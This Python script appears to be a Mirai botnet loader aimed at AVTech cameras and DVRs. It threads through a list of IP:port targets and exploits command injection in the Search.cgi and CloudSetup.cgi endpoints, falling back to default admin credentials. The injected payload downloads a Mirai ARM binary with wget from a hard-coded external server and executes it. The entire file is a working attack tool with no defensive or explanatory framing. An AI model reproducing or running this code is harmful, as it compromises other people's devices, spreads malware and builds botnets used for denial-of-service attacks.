#   Avtech loader 

import sys, time, requests
from threading import Thread
import random

num = 1
host_server = "23.130.192.132"
ips = open(sys.argv[1], "r").readlines()
filename = random.randint(1, 100) # making a random num for first of file name so cant get killed ez and avoid any other probs
filename = str(filename) # making it a str variable so we can add it lol
payload = "cd%20/tmp;%20wget%20http://"+host_server+"/33bi/mirai.arm5%20-O%20"+filename+".mirai.arm5;%20chmod%20777%20"+filename+".mirai.arm5;%20./"+filename+".mirai.arm5%20avtech"
def avtech(num, ip, port):
    port = int(port)
    host = '%s:%d' % (ip, port)
    url = "http://"+host+"/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$("+payload+")&password=admin"
    try:
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, sdch",
            "Accept-Language": "en-US,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Host": ip,
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Snickers-Avtech"
        }
        r1 = requests.get(url, headers=headers)
        time.sleep(1)
        resp = r1.text
        if "ok" in resp.lower():
            print "(%d) Sent payload[1]" % (num)
        else:
            url1 = "http://"+host+"/nobody/ez.htm?a=YWRtaW46YWRtaW4=&rnd=0.06814667194551349"
            url2 = "http://"+host+"/cgi-bin/supervisor/CloudSetup.cgi?exefile="+payload+";%20echo%20snickers_was_here"
            r2 = requests.get(url1, headers=headers)
            time.sleep(0.5)
            r3 = requests.get(url2, headers=headers)
            time.sleep(1)
            resp = r3.text
            if "snickers_was_here" in resp.lower():
                print "(%d) Sent payload[2]" % (num)
            else:
                print "(%d) Failed to send both payloads..." % (num)
    except:
        pass
      
print "[AVTech] Directing Bots Towards -> %s" % (host_server)
for i in ips:
    i = i.strip("\r\n")
    info = i.split(":")
    ip = info[0]
    port = info[1]
    proc = Thread(target=avtech, args=(num, ip, port,))
    proc.start()
    num += 1
    
print "[AVTech] Finished Loading..."